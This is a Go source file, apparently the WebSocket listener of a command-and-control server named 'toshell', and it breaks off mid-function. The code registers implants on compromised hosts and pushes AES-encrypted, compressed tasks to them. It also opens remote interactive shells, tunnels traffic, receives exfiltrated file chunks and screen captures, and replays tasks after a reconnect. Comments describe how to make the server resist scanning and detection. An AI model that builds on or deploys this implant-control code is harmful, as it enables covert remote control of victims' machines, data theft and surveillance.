package listener

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"toshell/internal/common/crypto"
	"toshell/internal/common/protocol"
	"toshell/internal/common/transport"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
	"toshell/internal/server/config"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
)

type Listener struct {
	server       *http.Server
	sessionMgr   *session.Manager
	taskMgr      TaskManager
	encryptor    *crypto.Encryptor
	encKey       []byte // raw key for XOR fast-path tunnel encoding
	wsServer     *transport.Server
	cfg          *config.ListenerConfig
	onTaskResult TaskEventCallback
	connSession  sync.Map // *transport.Conn → sessionID string (for tunnel stream dispatch)

	// 会话生命周期回调（与 TCP/HTTP 监听器对齐）
	onSessionDead   func(sessionID string)
	onSessionOnline func(info *types.SessionInfo)
	onScreenFrame   func(sessionID string, payload []byte)
	stopOnce        sync.Once

	// 心跳判死（对齐 TCPListener.heartbeatChecker）
	heartbeatTimeout time.Duration
	stopChan         chan struct{}
	checkerOnce      sync.Once
}

type TaskManager interface {
	Complete(id uint64, exitCode int32, output, errorMsg string) error
	Fail(id uint64, errorMsg string) error
	// FailWithResult 失败终态 + **保留植入端回传的输出与退出码**
	// （v1.4.0 S6 P0-2：非 0 退出码的工具，其 stdout 往往正是排障要看的失败原因）
	FailWithResult(id uint64, exitCode int32, output, errorMsg string) error
	Get(id uint64) (*types.TaskInfo, error)
	GetNext(sessionID string) (*types.TaskInfo, error)
	GetNextBatch(sessionID string, max int) []*types.TaskInfo
	UpdateProgress(id uint64, progress int) error
	ListReplayable(sessionID string) []*types.TaskInfo
	RequeueSent(sessionID string, staleAfter time.Duration) int
	TrackTransfer(taskID uint64, transferID string, size int64, received int64)
	GetTransfer(taskID uint64) (*task.TransferState, bool)
	ClearTransfer(taskID uint64)
}

func NewListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskMgr TaskManager) (*Listener, error) {
	key := []byte(cfg.EncryptionKey)
	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create encryptor: %w", err)
	}

	wsServer := transport.NewServer()
	// 主动探测面收敛（v1.4.0 S5 第 0 步）：只允许配置的那一条路径升级，可选 Host
	// 白名单；被拒的握手经 onUpgradeReject 落结构化日志。策略放在 transport 层
	// 执行（那里才知道"请求行原样长什么样"），日志策略放在这里（服务端才知道
	// 什么该记、记多少）。
	wsServer.SetUpgradePolicy(transport.UpgradePolicy{
		Path:          cfg.WSPath,
		HostAllowlist: cfg.WSHostAllowlist,
	})

	listener := &Listener{
		sessionMgr:  sessMgr,
		taskMgr:     taskMgr,
		encryptor:   enc,
		encKey:      key,
		wsServer:    wsServer,
		cfg:         cfg,
		stopChan:    make(chan struct{}),
		stopOnce:    sync.Once{},
		checkerOnce: sync.Once{},
	}
	wsServer.SetOnUpgradeReject(listener.onUpgradeReject)
	if cfg.HeartbeatTimeout > 0 {
		listener.heartbeatTimeout = cfg.HeartbeatTimeout
	} else {
		listener.heartbeatTimeout = 60 * time.Second
	}

	wsServer.SetOnConnect(listener.handleConnect)
	wsServer.SetOnMessage(listener.handleMessage)
	wsServer.SetOnClose(listener.handleClose)

	return listener, nil
}

// SetOnTaskResult sets a callback that will be invoked when a task result is received from implant.
func (l *Listener) SetOnTaskResult(cb TaskEventCallback) {
	l.onTaskResult = cb
}

// SetOnSessionDead sets a callback invoked when a session disconnects.
func (l *Listener) SetOnSessionDead(cb func(sessionID string)) { l.onSessionDead = cb }

// SetOnSessionOnline sets a callback invoked when a new session registers.
func (l *Listener) SetOnSessionOnline(cb func(info *types.SessionInfo)) { l.onSessionOnline = cb }

// SetOnScreenFrame sets a callback invoked when a screen frame arrives.
func (l *Listener) SetOnScreenFrame(cb func(sessionID string, payload []byte)) { l.onScreenFrame = cb }

// ListRelayNodes WebSocket 监听器不提供中继节点：链式回连（Beacon Mesh）只在
// TCP 通道实现（见 SupportsRelayChannel 的说明）。
//
// 返回**非 nil 空切片**而不是 nil：与 HTTPListener.ListRelayNodes 逐字一致
// （nil 会被上层归一成 []，但两处写成一个样子能省掉"到底支不支持"的猜测）。
func (l *Listener) ListRelayNodes() []types.RelayNode { return []types.RelayNode{} }

// onUpgradeReject 记录被拒绝的 WebSocket 升级尝试（结构化：原因 / 路径 / Host /
// 远端 IP）。
//
// 噪声过滤：只记录"看起来在尝试 WS 升级"的请求，以及"Host 不在白名单"的请求。
// 公网背景噪声里大量随机路径的普通 GET（扫目录、扫端口、favicon）不该把日志刷满，
// 否则真正的 WS 探测反而被淹没 —— 这也是为什么 transport 层把 HandshakeAttempt
// 一并带上来而不是在这里重新判。
//
// 不记录请求头集合、不记录 query：拒绝日志要能回答"是不是有人在扫我"，但记全量
// 头/URL 有把 Cookie/Authorization/token 写进日志的风险（凭据类内容一律不落）。
func (l *Listener) onUpgradeReject(info transport.UpgradeReject) {
	if !info.HandshakeAttempt && info.Reason != transport.RejectHostNotAllowed {
		return
	}
	extra := ""
	if info.RawPath != "" && info.RawPath != info.Path {
		extra = " raw_path=" + sanitizeLogField(info.RawPath)
	}
	logging.Warn("listener", "websocket upgrade rejected: reason=%s path=%s%s host=%s remote_ip=%s",
		info.Reason, sanitizeLogField(info.Path), extra, sanitizeLogField(info.Host), sanitizeLogField(info.RemoteIP))
}

// sanitizeLogField 把请求里可控的字段（路径 / Host / 远端地址）压成日志安全串。
//
// 为什么必须做：logging 的 json 格式是把 message 直接 fmt.Sprintf 进 JSON 字符串的
// （见 internal/server/logging/logging.go）—— 字段里出现 `"`、`\` 或换行就能撕开/
// 伪造日志行（日志注入）。这里只保留可见 ASCII（0x20~0x7E），其余一律替换成 '?'，
// 并截断长度防止用超长路径刷日志体积。
func sanitizeLogField(s string) string {
	const maxLen = 256
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c < 0x20 || c > 0x7E || c == '"' || c == '\\' {
			b.WriteByte('?')
		} else {
			b.WriteByte(c)
		}
		if b.Len() >= maxLen {
			b.WriteString("...")
			break
		}
	}
	return b.String()
}

func (l *Listener) PushTask(sessionID string, taskInfo *types.TaskInfo) error {
	conn, err := l.sessionMgr.GetConnection(sessionID)
	if err != nil {
		return fmt.Errorf("no active connection for session %s", sessionID)
	}

	wsConn, ok := conn.(*transport.Conn)
	if !ok {
		return fmt.Errorf("invalid connection type")
	}

	taskPayload, err := json.Marshal(protocol.Task{
		ID:          taskInfo.ID,
		TaskType:    taskInfo.TaskType,
		Command:     taskInfo.Command,
		Args:        taskInfo.Args,
		Timeout:     taskInfo.Timeout,
		ExecuteType: taskInfo.ExecuteType,
		Path:        taskInfo.Path,
		PID:         taskInfo.PID,
		Data:        taskInfo.Data,
	})
	if err != nil {
		return fmt.Errorf("failed to marshal task: %w", err)
	}

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeTask,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   taskPayload,
	}

	data := encodePacket(packet)
	compressed, err := compress(data)
	if err != nil {
		return fmt.Errorf("failed to compress: %w", err)
	}

	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		return fmt.Errorf("failed to encrypt: %w", err)
	}

	if err := wsConn.WriteMessage(encrypted); err != nil {
		l.sessionMgr.ClearConnection(sessionID)
		return fmt.Errorf("failed to send task: %w", err)
	}

	// Mark task as sent
	now := time.Now()
	taskInfo.Status = "sent"
	taskInfo.SentAt = &now

	fmt.Printf("[INFO] [listener] Task %d pushed to session %s\n", taskInfo.ID, sessionID)
	return nil
}

// PushFileUpload 读取服务端暂存的上传文件分块推送（TypeFileUpload 帧，与 TCP 一致）。
// 简化实现：直接读 data/uploads/<sessionID>/<uploadID> 分块发送，done 帧收尾。
func (l *Listener) PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error {
	if uploadID == "" || strings.ContainsAny(uploadID, `/\:`) {
		return fmt.Errorf("invalid upload id %q", uploadID)
	}
	if targetPath == "" || strings.ContainsRune(targetPath, 0) {
		return fmt.Errorf("invalid target path")
	}

	src := filepath.Join("data", "uploads", sessionID, uploadID)
	f, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("upload staging file not found: %w", err)
	}
	defer f.Close()

	buf := make([]byte, 256*1024)
	var offset int64
	for {
		n, rerr := f.Read(buf)
		if n > 0 {
			chunk, _ := json.Marshal(map[string]interface{}{
				"upload_id": uploadID,
				"task_id":   taskID,
				"filename":  filename,
				"path":      targetPath,
				"size":      size,
				"offset":    offset,
				"done":      false,
				"data":      base64.StdEncoding.EncodeToString(buf[:n]),
			})
			if err := l.sendCtrl(sessionID, protocol.TypeFileUpload, chunk); err != nil {
				return fmt.Errorf("failed to push upload chunk: %w", err)
			}
			offset += int64(n)
		}
		if rerr != nil {
			if rerr != io.EOF {
				return fmt.Errorf("read upload staging failed: %w", rerr)
			}
			break
		}
	}
	done, _ := json.Marshal(map[string]interface{}{
		"upload_id": uploadID,
		"task_id":   taskID,
		"filename":  filename,
		"path":      targetPath,
		"size":      size,
		"offset":    offset,
		"done":      true,
	})
	if err := l.sendCtrl(sessionID, protocol.TypeFileUpload, done); err != nil {
		return fmt.Errorf("failed to push upload done: %w", err)
	}
	return nil
}

// xorFrame XOR-encodes the entire buffer in-place using the key.
// XOR is self-inverse; the same function serves as encode and decode.
func xorFrame(data []byte, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
}

// SendTunnelRaw sends raw tunnel packets (already batched) to the implant.
func (l *Listener) SendTunnelRaw(sessionID string, rawPacket []byte) error {
	conn, err := l.sessionMgr.GetConnection(sessionID)
	if err != nil {
		return fmt.Errorf("no active connection for session %s", sessionID)
	}

	wsConn, ok := conn.(*transport.Conn)
	if !ok {
		return fmt.Errorf("invalid connection type")
	}

	payload := make([]byte, 4+len(rawPacket))
	binary.BigEndian.PutUint32(payload[:4], uint32(len(rawPacket)))
	copy(payload[4:], rawPacket)

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeTunnel,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}

	data := encodePacket(packet)
	compressed, err := compress(data)
	if err != nil {
		return fmt.Errorf("failed to compress: %w", err)
	}

	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		return fmt.Errorf("failed to encrypt: %w", err)
	}

	// 不调用 ClearConnection：单次隧道写入失败不应销毁整个 session
	if err := wsConn.WriteMessage(encrypted); err != nil {
		return fmt.Errorf("failed to send tunnel packet: %w", err)
	}

	return nil
}

func (l *Listener) SendTunnelPacket(sessionID string, tunnelPacket *tunnel.TunnelPacket) error {
	conn, err := l.sessionMgr.GetConnection(sessionID)
	if err != nil {
		return fmt.Errorf("no active connection for session %s", sessionID)
	}

	wsConn, ok := conn.(*transport.Conn)
	if !ok {
		return fmt.Errorf("invalid connection type")
	}

	encodedPacket := tunnel.EncodeTunnelPacket(tunnelPacket)

	payload := make([]byte, 4+len(encodedPacket))
	binary.BigEndian.PutUint32(payload[:4], uint32(len(encodedPacket)))
	copy(payload[4:], encodedPacket)

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeTunnel,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}

	data := encodePacket(packet)
	compressed, err := compress(data)
	if err != nil {
		return fmt.Errorf("failed to compress: %w", err)
	}

	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		return fmt.Errorf("failed to encrypt: %w", err)
	}

	// 不调用 ClearConnection：单次隧道写入失败不应销毁整个 session
	if err := wsConn.WriteMessage(encrypted); err != nil {
		return fmt.Errorf("failed to send tunnel packet: %w", err)
	}

	return nil
}

func (l *Listener) Start() error {
	if !l.cfg.Enabled {
		return fmt.Errorf("listener disabled")
	}

	addr := fmt.Sprintf("%s:%d", l.cfg.Host, l.cfg.Port)
	// 先同步 bind，端口占用立即返回错误（而非 goroutine 静默失败）
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", addr, err)
	}
	l.server = &http.Server{
		Addr: addr,
		// 直接挂 WebSocket handler，**不过 http.ServeMux**：ServeMux 会先把
		// `//`、`/./`、`..` 清洗成规范路径并对变形请求回 301 重定向 —— 那是
		// ServeMux 的通用行为，但 ① 对探测者仍是"这里有个会转发的服务"的额外
		// 信号，② 清洗后的路径让"变形尝试"无法在传输层被观察到。这里改为由
		// transport.Server 自己对原始请求做严格比较，一切不匹配统一走普通 404。
		Handler:      l.wsServer,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	// 心跳判死协程（与 TCP 对齐）：WS 连接挂死时回收会话
	l.checkerOnce.Do(func() {
		go l.heartbeatChecker()
	})

	go func() {
		var serveErr error
		if l.cfg.TLSEnabled {
			tlsConfig := &tls.Config{
				MinVersion: tls.VersionTLS12,
			}
			l.server.TLSConfig = tlsConfig
			serveErr = l.server.ServeTLS(ln, l.cfg.CertFile, l.cfg.KeyFile)
		} else {
			serveErr = l.server.Serve(ln)
		}
		if serveErr != nil && serveErr != http.ErrServerClosed {
			fmt.Printf("[ERROR] [listener] Listener error: %v\n", serveErr)
		}
	}()

	fmt.Printf("[INFO] [listener] Listener started on %s:%d\n", l.cfg.Host, l.cfg.Port)
	return nil
}

// heartbeatChecker 周期性检查会话心跳超时，标记 dead 并触发 onSessionDead。
func (l *Listener) heartbeatChecker() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-l.stopChan:
			return
		case <-ticker.C:
			l.checkHeartbeats()
		}
	}
}

func (l *Listener) checkHeartbeats() {
	sessions := l.sessionMgr.List()
	now := time.Now()
	for _, sess := range sessions {
		if sess == nil || sess.Info == nil || sess.Info.Status == "dead" {
			continue
		}
		if now.Sub(sess.LastSeen) > l.heartbeatTimeout {
			fmt.Printf("[INFO] [listener] Session %s timed out (last seen: %v ago)\n",
				sess.Info.ID, now.Sub(sess.LastSeen).Round(time.Second))
			sess.Info.Status = "dead"
			l.sessionMgr.ClearConnection(sess.Info.ID)
			if l.onSessionDead != nil {
				l.onSessionDead(sess.Info.ID)
			}
		} else if sess.Info.Status != "active" {
			sess.Info.Status = "active"
		}
	}
}

func (l *Listener) Stop() error {
	var stopErr error
	l.stopOnce.Do(func() {
		if l.stopChan != nil {
			close(l.stopChan)
			l.stopChan = nil
		}
		if l.server == nil {
			return
		}
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := l.server.Shutdown(ctx); err != nil {
			fmt.Printf("[ERROR] [listener] Failed to stop listener: %v\n", err)
			stopErr = err
			return
		}
		fmt.Printf("[INFO] [listener] Listener stopped\n")
	})
	return stopErr
}

func (l *Listener) handleConnect(conn *transport.Conn) {
	fmt.Printf("[INFO] [listener] New WebSocket connection\n")
}

func (l *Listener) handleMessage(conn *transport.Conn, data []byte) {
	if len(data) == 0 {
		return
	}

	// All packets go through AES-GCM
	decrypted, err := l.encryptor.Decrypt(data)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to decrypt data: %v\n", err)
		return
	}

	decompressed, err := decompressData(decrypted)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to decompress data: %v\n", err)
		return
	}

	packet, err := parsePacket(decompressed)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to parse packet: %v\n", err)
		return
	}

	remoteAddr := "unknown"
	switch packet.Type {
	case protocol.TypeRegister:
		l.handleRegister(conn, packet, remoteAddr)
	case protocol.TypeHeartbeat:
		l.handleHeartbeat(conn, packet)
	case protocol.TypeResult:
		l.handleResult(conn, packet)
	case protocol.TypeShellData:
		l.handleShellData(conn, packet)
	case protocol.TypeTunnel:
		l.handleTunnel(conn, packet)
	case protocol.TypeFileDown:
		// 会话热迁移：WS 通道大文件分块直传（与 TCP 共用落盘逻辑）
		l.handleFileDown(conn, packet)
	case protocol.TypeScreenFrame:
		if l.onScreenFrame != nil {
			l.onScreenFrame(fmt.Sprintf("%x", packet.ID), packet.Payload)
		}
	case protocol.TypeRelayStatus:
		// 中继植入体上报"我在监听"的帧（{"addr":...}）——服务端在 WS 通道上
		// 不维护中继节点表，这里只留一条日志，把操作员从"任务回报成功"的错觉里
		// 拉出来（见下面 TypeRelay 的说明）。
		var st struct {
			Addr string `json:"addr"`
		}
		_ = json.Unmarshal(packet.Payload, &st)
		logging.Warn("listener", "relay status frame on websocket channel ignored (relay is TCP-only): session=%s addr=%s",
			fmt.Sprintf("%x", packet.ID), sanitizeLogField(st.Addr))
	case protocol.TypeRelay:
		// 中继（Beacon Mesh）只在 TCP 通道实现：上行解包（unwrapRelayPayload）、
		// 下行包装（sendOrQueue→wrapAndSend）、子会话注册（handleRegisterRelayed）
		// 以及隧道 raw 帧的 SM4 密钥（sm4Key）全部挂在 TCPListener 上，子帧沿用的
		// 也是 TCP 的 [4B len][1B type][cipher] 格式，而不是 WS 的"裸 AES-GCM 消息"。
		//
		// WS 通道收到这类帧 = 中继植入体把自己的 C2 通道建在了 WS 上：植入端确实
		// 开始监听了，但上行子帧在服务端无处可解 —— 子植入体永远上不了线。这里
		// **显式记日志**而不是静默丢弃：静默失败会让操作员以为中继在跑（任务回报
		// "relay listener started"），实际一个子节点都不会出现。
		// 同一问题在 API 侧由 relayControlHandler 直接 409 拒绝（见 handlers_relay.go）。
		// 负载是二进制（routeID + 子帧密文），只记长度、不记内容。
		logging.Warn("listener", "relay frame on websocket channel ignored (relay is TCP-only): session=%s bytes=%d",
			fmt.Sprintf("%x", packet.ID), len(packet.Payload))
	}
}

// handleFileDown 接收植入端大文件分块（WebSocket 通道，与 TCP 共用落盘核心）。
func (l *Listener) handleFileDown(conn *transport.Conn, packet *protocol.Packet) {
	var chunk fileDownChunk
	if err := json.Unmarshal(packet.Payload, &chunk); err != nil {
		fmt.Printf("[ERROR] [listener] fileDown: bad chunk json: %v\n", err)
		return
	}
	sid := fmt.Sprintf("%x", packet.ID)

	if _, err := processFileDownChunk(sid, chunk); err != nil {
		fmt.Printf("[ERROR] [listener] fileDown: %v\n", err)
		return
	}

	// 落盘成功后才记录断点进度（重连续传用），状态挂全局 task.Manager
	// （listener 实例会随 stop/start 重建，断点必须跨实例存活）
	if l.taskMgr != nil && chunk.TaskID > 0 {
		if chunk.Done {
			l.taskMgr.ClearTransfer(chunk.TaskID)
		} else if n, ok := decodedLen(chunk.Data); ok {
			l.taskMgr.TrackTransfer(chunk.TaskID, chunk.TransferID, chunk.Size, chunk.Offset+int64(n))
		}
	}
	if chunk.TaskID > 0 && chunk.Size > 0 && l.taskMgr != nil {
		if chunk.Done {
			_ = l.taskMgr.UpdateProgress(chunk.TaskID, 100)
		} else if n, ok := decodedLen(chunk.Data); ok {
			written := chunk.Offset + int64(n)
			pct := int(written * 100 / chunk.Size)
			if pct > 99 {
				pct = 99
			}
			_ = l.taskMgr.UpdateProgress(chunk.TaskID, pct)
		}
	}
}

// handleShellData 处理上行 shell 输出（与 TCP 监听器一致）。
func (l *Listener) handleShellData(conn *transport.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
	var data struct {
		Data string `json:"data"`
		CWD  string `json:"cwd"`
	}
	if err := json.Unmarshal(packet.Payload, &data); err != nil {
		return
	}
	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil || sess == nil {
		return
	}
	sess.LastSeen = time.Now()
	sess.Info.LastSeen = time.Now()
	if data.CWD != "" {
		sess.SetShellCWD(data.CWD)
	}
	sess.DispatchShellOutput([]byte(data.Data))
}

// ─── ShellController（交互式 shell：服务端→植入端指令帧） ────────────

// OpenShell 下发 TypeShellOpen 帧。
func (l *Listener) OpenShell(sessionID string, shell string) error {
	payload, _ := json.Marshal(map[string]string{"shell": shell})
	return l.sendCtrl(sessionID, protocol.TypeShellOpen, payload)
}

// SendShellInput 下发 TypeShellData 帧（写入植入端 shell stdin）。
func (l *Listener) SendShellInput(sessionID string, data string) error {
	payload, _ := json.Marshal(map[string]string{"data": data})
	return l.sendCtrl(sessionID, protocol.TypeShellData, payload)
}

// CloseShell 下发 TypeShellClose 帧。
func (l *Listener) CloseShell(sessionID string) error {
	return l.sendCtrl(sessionID, protocol.TypeShellClose, []byte("{}"))
}

// sendCtrl 向会话发送一个控制帧（AES-GCM 加密）。
func (l *Listener) sendCtrl(sessionID string, typ byte, payload []byte) error {
	conn, err := l.sessionMgr.GetConnection(sessionID)
	if err != nil {
		return fmt.Errorf("no active connection for session %s", sessionID)
	}
	wsConn, ok := conn.(*transport.Conn)
	if !ok {
		return fmt.Errorf("invalid connection type")
	}

	packet := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      typ,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	data := encodePacket(packet)
	compressed, err := compress(data)
	if err != nil {
		return fmt.Errorf("failed to compress: %w", err)
	}
	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		return fmt.Errorf("failed to encrypt: %w", err)
	}
	if err := wsConn.WriteMessage(encrypted); err != nil {
		return fmt.Errorf("failed to send ctrl frame: %w", err)
	}
	return nil
}

// handleTunnelStream 处理原始隧道流帧（快速通道）。
// rawData 格式: [4B len][rawPkt][4B len][rawPkt]...（批处理）
func (l *Listener) handleTunnelStream(conn *transport.Conn, rawData []byte) {
	sid, ok := l.connSession.Load(conn)
	if !ok {
		return
	}
	sess, err := l.sessionMgr.Get(sid.(string))
	if err != nil || sess == nil {
		return
	}

	offset := 0
	for offset+4 <= len(rawData) {
		pktLen := binary.BigEndian.Uint32(rawData[offset:])
		offset += 4
		if offset+int(pktLen) > len(rawData) {
			break
		}
		tp := parseTunnelPacket(rawData[offset : offset+int(pktLen)])
		offset += int(pktLen)
		if tp != nil {
			sess.DispatchTunnelData(tp)
		}
	}
}

func (l *Listener) handleClose(conn *transport.Conn) {
	l.connSession.Delete(conn)
	fmt.Printf("[INFO] [listener] WebSocket connection closed\n")
}

func (l *Listener) handleRegister(conn *transport.Conn, packet *protocol.Packet, remoteAddr string) {
	reg, err := unmarshalRegister(packet.Payload)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to unmarshal register: %v\n", err)
		return
	}

	sessInfo := buildSessionInfo(packet, reg, "websocket", l.cfg.ID, remoteAddr)

	if l.sessionMgr != nil {
		// 已存在（重连）：刷新信息而非重建，保留上层状态（隧道/shell 处理器）
		if existing, gerr := l.sessionMgr.Get(sessInfo.ID); gerr == nil && existing != nil {
			wasDead := existing.Info == nil || existing.Info.Status == "dead" || existing.Info.Status == "asleep"
			sessInfo.RemoteAddr = remoteAddr
			sessInfo.LastSeen = time.Now()
			_ = l.sessionMgr.RefreshInfo(sessInfo.ID, sessInfo)
			// 死亡会话重连复活：广播上线事件，前端即时点亮
			if wasDead && l.onSessionOnline != nil {
				l.onSessionOnline(sessInfo)
			}
		} else {
			if err := l.sessionMgr.Add(sessInfo); err != nil {
				fmt.Printf("[ERROR] [listener] Failed to add session: %v\n", err)
			} else if l.onSessionOnline != nil {
				l.onSessionOnline(sessInfo)
			}
		}
		l.sessionMgr.SetConnection(sessInfo.ID, conn)
		l.connSession.Store(conn, sessInfo.ID)

		// 会话热迁移（重连续传）：重连后补发在途任务
		replayed := replaySessionTasks(l.taskMgr, l, l, sessInfo.ID)
		if replayed > 0 {
			fmt.Printf("[INFO] [listener] Hot-migrate: replayed %d in-flight task(s) for session %s\n", replayed, sessInfo.ID)
		}
	}

	fmt.Printf("[INFO] [listener] Implant registered: %s (%s@%s)\n", sessInfo.ID, sessInfo.Username, sessInfo.Hostname)

	resp := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"registered"}`),
	}

	data := encodePacket(resp)
	compressed, err := compress(data)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to compress data: %v\n", err)
		return
	}

	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to encrypt data: %v\n", err)
		return
	}

	if err := conn.WriteMessage(encrypted); err != nil {
		fmt.Printf("[ERROR] [listener] Failed to send ack: %v\n", err)
	}
}

func (l *Listener) handleHeartbeat(conn *transport.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
	// 能力位（v1.4.0 S4）：与 TCP 监听器一致，解析心跳负载里的能力位图。
	applyHeartbeatModules(l.sessionMgr, sessionID, packet.Payload)

	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil {
		fmt.Printf("[DEBUG] [listener] Session not found: %s (error: %v)\n", sessionID, err)
	} else if sess != nil {
		sess.LastSeen = time.Now()
		// 仅当心跳来自当前绑定的连接时才刷新连接绑定：
		// 防止重连期间旧连接残留的心跳把 session.Conn 覆盖回已关闭的连接。
		// （与 TCP 监听器 handleHeartbeat 的 conn 身份校验对齐）
		if cur, ok := l.connSession.Load(conn); ok && cur == sessionID {
			l.sessionMgr.SetConnection(sessionID, conn)
		} else {
			// 反向校验：当前会话绑定的连接若是本 conn 也刷新（注册后首次心跳）
			bound, _ := l.sessionMgr.GetConnection(sessionID)
			if bc, isWC := bound.(*transport.Conn); isWC && bc == conn {
				l.sessionMgr.SetConnection(sessionID, conn)
			}
		}
	}

	resp := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"ok"}`),
	}

	data := encodePacket(resp)
	compressed, err := compress(data)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to compress data: %v\n", err)
		return
	}

	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to encrypt data: %v\n", err)
		return
	}

	if err := conn.WriteMessage(encrypted); err != nil {
		fmt.Printf("[ERROR] [listener] Failed to send heartbeat ack: %v\n", err)
	}
}

func (l *Listener) handleResult(conn *transport.Conn, packet *protocol.Packet) {
	var result protocol.Result
	if err := json.Unmarshal(packet.Payload, &result); err != nil {
		fmt.Printf("[ERROR] [listener] Failed to unmarshal result: %v\n", err)
		return
	}

	sessionID := fmt.Sprintf("%x", packet.ID)
	fmt.Printf("[INFO] [listener] Task %d completed: exit_code=%d, output_len=%d\n", result.TaskID, result.ExitCode, len(result.Output))

	if l.taskMgr != nil {
		if result.ExitCode == 0 && result.Error == "" {
			if err := l.taskMgr.Complete(result.TaskID, result.ExitCode, result.Output, result.Error); err != nil {
				fmt.Printf("[ERROR] [listener] Failed to complete task: %v\n", err)
			} else {
				fmt.Printf("[INFO] [listener] Task %d marked as completed in task manager\n", result.TaskID)
			}
		} else {
			errMsg := result.Error
			if errMsg == "" && result.ExitCode != 0 {
				errMsg = fmt.Sprintf("exit code %d", result.ExitCode)
			}
			l.taskMgr.FailWithResult(result.TaskID, result.ExitCode, result.Output, errMsg)
		}
	}

	// Notify via callback (WebSocket broadcast to frontend)
	if l.onTaskResult != nil {
		taskType := result.TaskType
		if taskType == "" {
			if ti, tiErr := l.taskMgr.Get(result.TaskID); tiErr == nil && ti != nil {
				taskType = ti.TaskType
			}
		}
		eventType := "task_completed"
		if result.Error != "" || result.ExitCode != 0 {
			eventType = "task_failed"
		}
		l.onTaskResult(eventType, result.TaskID, sessionID, taskType, result.ExitCode, result.Output, result.Error)
	}

	resp := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        packet.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"ok"}`),
	}

	data := encodePacket(resp)
	compressed, err := compress(data)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to compress data: %v\n", err)
		return
	}

	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		fmt.Printf("[ERROR] [listener] Failed to encrypt data: %v\n", err)
		return
	}

	if err := conn.WriteMessage(encrypted); err != nil {
		fmt.Printf("[ERROR] [listener] Failed to send result ack: %v\n", err)
	}
}

func (l *Listener) handleTunnel(conn *transport.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)

	sess, err := l.sessionMgr.Get(sessionID)
	if err != nil {
		fmt.Printf("[DEBUG] [listener] Tunnel packet for unknown session: %s\n", sessionID)
		return
	}

	if len(packet.Payload) < 4 {
		return
	}

	dataLen := binary.BigEndian.Uint32(packet.Payload[:4])
	if len(packet.Payload) < 4+int(dataLen) {
		return
	}

	tunnelData := packet.Payload[4 : 4+int(dataLen)]

	// Implant sends raw msgData, not batched [4B len][pkt] format.
	// Decode directly as TunnelPacket.
	tp := parseTunnelPacket(tunnelData)
	if tp != nil {
		sess.DispatchTunnelData(tp)
	}
}

// parseTunnelPacket 从原始隧道字节解析单个 TunnelPacket
func parseTunnelPacket(data []byte) *tunnel.TunnelPacket {
	if len(data) < 1 {
		return nil
	}

	op := data[0]
	tp := &tunnel.TunnelPacket{Type: op}

	if len(data) >= 5 {
